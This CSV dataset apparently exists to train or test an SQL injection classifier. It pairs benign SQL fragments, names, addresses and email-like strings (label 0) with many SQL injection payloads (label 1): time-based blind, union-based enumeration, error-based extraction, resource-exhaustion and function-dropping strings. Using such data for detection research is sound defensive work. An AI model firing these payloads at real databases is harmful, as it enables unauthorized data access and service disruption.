query,label
"select * from living where driven between ""him"" and    ""consist""",0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,1
select * from children where use in  ( select blanket from aside ),0
jocs olimpics 110 1-b,0
addons,0
60781516z,0
8029,0
select avg ( phrase ) from ahead select sum ( related ),0
select * from managed where fish = 'pencil' limit 3,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",1
"select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
select * from establish order by neck desc,0
bisad,0
2esco63enti2,0
select avg ( moon ) from saw select sum ( concerned ),0
select * from sudden  where industrial = bigger,0
select direct from church,0
select * from forty where across  between 10 and 20,0
select * from angry fetch first 50 percent rows onlyselect top 3 * from search,0
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",1
"select orders.platesrid, employees.sister, employees.round from ordersright join employees on orders.employeeid  =  employees.inid order by orders.aliveid",0
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1
select * from central where experience = 'movement',0
1'||  (  select 'yzdz' where 5021  =  5021,1
select * from stretch where cast between '1996-07-01' and '1996-07-31',0
"1   )    )    union all select null,null,null,null,null,null,null,null--",1
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",1
if  (  9690  =  6491  )   select 9690 else drop function nyln--,1
54430634f,0
select * from place where ought not between 'belt' and 'noon',0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar",1
2300,0
1  )   where 4600  =  4600 or sleep  (  5  )  --,1
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",1
"1""   )    )     )   and 4595  =  4595#",1
select * from mountain where consist between '1996-07-01' and '1996-07-31',0
select hair ( s ) from drove inner join,0
"select * from users where id  =  '1' union select \#,@@version -- 1'",1
valdebenito garabana,0
levitin,0
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1
select * from open where throughout = 'fought'  and city = 'me',0
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",1
select * from story fetch first 3 rows only select top 50 percent * from monkey,0
"pl. san anton, 102",0
select fire ( s ) from stepped inner join,0
pent0et3o,0
e50land5cer,0
"select * from alone order by mind, two",0
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,1
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",1
"1""   )    )    as ljhz where 2416  =  2416",1
select top 3 * from ask where body = 'clearly' select * from donkey,0
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
9637,0
-4873'   )    )     )   or 3038  =  3038,1
"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1%'   )    )    and 7160  =  7249--,1
select related ( s from rod right join,0
rupp@djbroadcast.gov,0
select top 3 * from inch where around = 'slip' select * from social,0
select top 50 percent * from vote select * from simplest fetch first 50 percent rows onlyselect top 3 * from test,0
ibero saborit,0
select our ( s )  from square union all,0
"select date_sub ( ""2017-06-15 09:34:21"", interval 3 hour ) ;",0
48551498q,0
carrer de merida 35 8-c,0
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )",1
select * from column  where star not like '[drawn]%',0
"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'miir' like 'miir",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1
walborn@19horas.cat,0
"passatge credit, 93, 13-c",0
"-5691' union all select 6610,6610#",1
"select fed,kill from flew where wing = 'pile' union select larger, fireplace from dry",0
select count ( * )  as clean,0
"1%""   )    )    order by 1#",1
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1
"calle hernandez iglesias, 160,",0
ubaldino,0
select * from child where best = 'rope',0
select * from something where    not parallel = 'deer',0
"-4692%""   )    )    union all select 1781,1781#",1
"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",1
"update bark set few =  'vapor', city =  'subject' where alphabet =  pretty",0
rebengivc@somosagelespaa.ie,0
v5482+ct0,0
rub,0
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",1
select * from camp order by ants,0
"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1
po29ip1t0l6,0
"c/ gaspar reyes, 172 8?f",0
23531966e,0
calle fermin salvochea 155,0
select avg ( office ) from among,0
"select * from users where id  =  1 or $+<1 union select 1,@@version -- 1",1
"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",1
select * from vegetable where purpose = 'canal'  or last = 'paint',0
select * from collect where newspaper between '1996-07-01' and '1996-07-31',0
select * from known where layers = 'opinion'  or arrange = 'fed',0
98538229l,0
"1""  )   where 8098  =  8098",1
select * from possibly where supply like '%consider%',0
yu-hung,0
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1
-7726 or 3038  =  3038,1
1'+  (  select tafk where 9652  =  9652,1
"1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",1
7u6can*i2a04n,0
"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select * from police order by forward asc, than desc",0
14638777j,0
select avg ( correctly ) from usually select sum ( shoot ),0
select whole ( s )  from dry union all,0
"select date_add ( ""2017-06-15 09:34:21"", interval 15 minute ) ;",0
urko,0
"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",1
--select * from customers;,0
select * from month fetch first 50 percent rows onlyselect top 3 * from dollar,0
"cuesta sagrado corazon, 155 5?a",0
"select fix as hollow, dull as [recall]  from over",0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1
1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,1
2783,0
select top 50 percent * from rubbed,0
delete from extra where log = 'population',0
select * from rubber where twenty = 'wheat',0
select * from ever where purple = 'probably',0
"select seedid as id, facing as claws from lack",0
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
4909,0
delmo,0
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""  =  ""eaqk",1
select top 50 percent * from running select * from flower fetch first 50 percent rows onlyselect top 3 * from recognize,0
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",1
repuesta,0
select min ( contrast )  as shirt from length,0
francina,0
select * from social where headed not between 'failed' and 'clothing',0
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
orcoyen leal,0
1'+  (  select 'wpnm' where 8223  =  8223 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',1
select * from throughout where history = 'seems' fetch first 3 rows only,0
banerjee6@getgold.ec,0
24768,0
"-3205""  )   union all select 5233,5233,5233,5233#",1
2.45e+15,0
burgoa planells,0
select building ( s )  from eaten select write ( s ),0
select * from rain 3,0
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",1
select * from he where jungle between 'cup' and 'could',0
"select * from title where captured not in  ( 'addition', 'cookies', 'previous' )",0
select * from your where lost  between 10 and 20,0
yern,0
"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--",1
"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --",1
"1'+  (  select 'swxi' where 7651  =  7651 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
"1 union all select null,null,null,null,null,null,null,null,null,null#",1
poma gozalbo,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",1
"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-1337""  )   union all select 7508--",1
suchet@ciaplast.tel,0
malacopterigio,0
select * from discussion where brass = 'stage'  and  ( plural = 'men' or gray = 'purple' ),0
"1""   )    )    union all select null,null,null,null,null,null,null,null--",1
select * from satellites order by concerned,0
recerdo,0
magdiel,0
update tight set several = 'pattern'where goose = 'reach',0
"select * from shop where greatest in  ( 'tomorrow', 'stay', 'plane' )",0
"-4091""   )    )     )   union all select 6694,6694--",1
tomono@esteticadayda.az,0
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",1
"calle mariano garcia, s/n",0
select   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1'   )    )    as dckd where 1794  =  1794,1
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1
select * from antenna_configs where status = 'active' or status = 'standby',0
"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
select * from wp_posts where id  =  262327 limit 1,0
1'||  (  select 'hkvl' from dual where 8882  =  8882,1
select top 3 * from pet where talk = 'face',0
1' where 2145  =  2145,1
select * from national where nervous not like 'exercise%',0
villaseca de uceda,0
destriana,0
40315,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy",1
"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",1
select top 3 * from easily where unless = 'percent',0
pipponzi,0
"c/ zilbetiko monasterioaren, s/n,",0
-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,1
"1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
4.4334e+15,0
guisset melo,0
ma724-3ra,0
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,1
select * from making where him  between 10 and 20,0
select * from recognize order by floor desc,0
"-6775"" union all select 7484,7484#",1
43470,0
"select * from users where id  =  '1' union select   (  \.  )  ,@@version -- 1'",1
alar1ado0,0
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
select offer ( s from salmon right join,0
select avg ( raise )  from declared  select sum ( tongue ),0
368,0
"calle miguel hernandez, 195,",0
select * from sale where shirt between '1996-07-01' and '1996-07-31',0
"select * from setting where struck in  ( 'drink', 'giving', 'temperature' )",0
d2sa2uer5o,0
select * from spirit,0
1'   )    )    as dqby where 9256  =  9256,1
select atan ( 2.5 ) ;,0
select * from port where goes not between 'some' and 'underline',0
8.51136e+15,0
denno,0
select top 50 percent * from basket select * from record fetch first 50 percent rows onlyselect top 3 * from youth,0
select top 3 * from care where figure = 'fastened',0
"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",1
"1   )    )    as sxhg where 7697  =  7697 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select * from climate where done = 'boat' fetch first 3 rows only,0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",1
"select count ( positive ) , sentence from ahead by sometime",0
select * from lonely,0
3.05338e+15,0
46177,0
select count ( ordinary ) from swung,0
select * from sky where such not like 'pitch%',0
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",1
oda,0
select top 3 * from constantly select * from outer 3select * from consider,0
_bielda,0
roze,0
1  )   and   (  3020  =  3020  )  *6703,1
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
"calle bir ganduz, 90",0
select * from each fetch first 3 rows only,0
"1'   )    )    union all select null,null,null,null,null,null--",1
select avg ( price ) from stream,0
revelante,0
select * from definition,0
select * from fix  where noon not like '[cent]%',0
select top 50 percent * from bean,0
select top 3 * from citizen select * from saw 3select * from jungle,0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1
select top 50 percent * from difficult,0
select * from tin fetch first 50 percent rows only,0
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',1
3.89139e+15,0
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1
"select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",1
"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
patay,0
select too from particularly union all select bit from plan order by nature,0
1 where 4372  =  4372,1
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
select * from get where citizen between alone09/01/1996getting and behavior15/31/1996under,0
beal,0
select torn ( s )  from pile union,0
select * from basket  where joy not like '[blow]%',0
"select shellsid as id, nice as dangerous from travel",0
inglis@baltasarsantos.vu,0
select case when 5346  =  8272 then 1 else null end--,1
"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
10459,0
"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",1
select * from feathers,0
brazzel1@castigadas.am,0
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",1
4az,0
paisaje,0
bnrinfo,0
"select earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich as arrow  from higher",0
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1
"select sleep  (  5  )   and ""jvys"" like ""jvys",1
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
recordar,0
1 where 3956  =  3956,1
select * from industrial  where safe = correctly,0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1
select avg ( molecular )  from week  select sum ( everywhere ),0
select * from north order by use desc,0
"select find_in_set ( ""q"", ""s,q,l"" ) ;",0
manguita,0
select top ( s )  from movement union,0
select column_name from table_name where condition group by column_name having condition order by  column_name;,0
"select anyid as id, famous as image from service",0
animador!a,0
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,1
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",1
2066,0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
select count ( * )  as badly,0
select option_value from wp_options where option_name  =  '_houzez_property_status_3086' limit 1,0
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%""  )   union all select null#",1
select * from ruler where master not like '[before]%',0
1'||  (  select 'iuud' where 3687  =  3687,1
"insert into loose  ( exercise, struck, chosen )  values  ( 'yet', 'importance', 'tomorrow' )",0
"select column_name ( s )  from ago,alike",0
select sink ( s )  from purpose select easy ( s ),0
85233754d,0
"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",1
select blow ( s )  from rather select sky ( s ),0
"select employees.can, count ( orders.shakingid )  as waitfrom    ( ordersinner join dull on orders.tiredid  =  employees.saddleid )",0
"select * from figure where worker not in  ( 'how', 'eye', 'familiar' )",0
select avg ( hospital ) from sometime select sum ( growth ),0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1
"1""  )   and sleep  (  5  )  #",1
select drive ( s )  from rest select roll ( s ),0
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1
"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )",1
6320,0
9.55464e+15,0
select * from separate where lunch not like 'five%',0
select * from complex where one like '%cut%',0
select * from  ( select somehow from rain ),0
1'  )   and 7533  =  7533,1
aleandro-hayman@tecnoindomo.nr,0
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",1
"calle la revoltosa, 55, 11c",0
91328189l,0
"select * from customers  order by country, customername;",0
aguazo,0
select avg ( refused ) from check,0
"select employees.carbon, count ( orders.viewid )  as dugfrom    ( ordersinner join constantly on orders.islandid  =  employees.blockid )",0
"1' where 4245  =  4245 union all select null,null--",1
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",1
"select richid as id, remain as thumb from swimming",0
select * from people  where gray not like '[obtain]%',0
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,1
d012965226m6ent0,0
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1
"-3249'   )    )     )   union all select 6309,6309#",1
select weak,0
lacruz morey,0
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1
select importance ( s ) from earth inner join,0
select avg ( gradually ) from teeth,0
enanzar,0
padoan@directoriogratuito.et,0
select count ( disappear )  from excited,0
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",1
34347,0
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1
"select column_name ( s )  from without,saved",0
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,1
select * from thumb order by belong,0
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",1
"-9313%""  )   or 5971  =  4572#",1
select * from lamp,0
select * from noise order by president desc,0
roncha,0
select * from fact where four = 'pound'  or darkness = 'remember',0
39,0
"(  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )",1
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",1
select avg ( explore ) from swept select sum ( model ),0
select * from mouth where copy = 'universe'  or done = 'men',0
5854,0
viana de jadraque,0
select count ( * )  as health,0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,1
from  ( select distinct serious from involved ),0
select count ( ill ) from thing,0
2425,0
7.77111e+15,0
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc",1
end and 'wdce'  =  'wdce,1
select avg ( price ) from stone,0
vasil9,0
elvian,0
"select * from dawn where men in  ( 'determine', 'valuable', 'improve' )",0
inund!ar,0
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"select * from users where id  =  '1' or $+<$ union select 1,@@version -- 1'",1
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1
-7277   )    )     )   order by 1#,1
1' where 1652  =  1652 and sleep  (  5  )  #,1
"-8200' in boolean mode  )   union all select 3360,3360--",1
12230,0
"update fact set is =  'proud', city =  'thin' where provide =  dried",0
apolilladura,0
select * from sudden order by useful,0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ),1
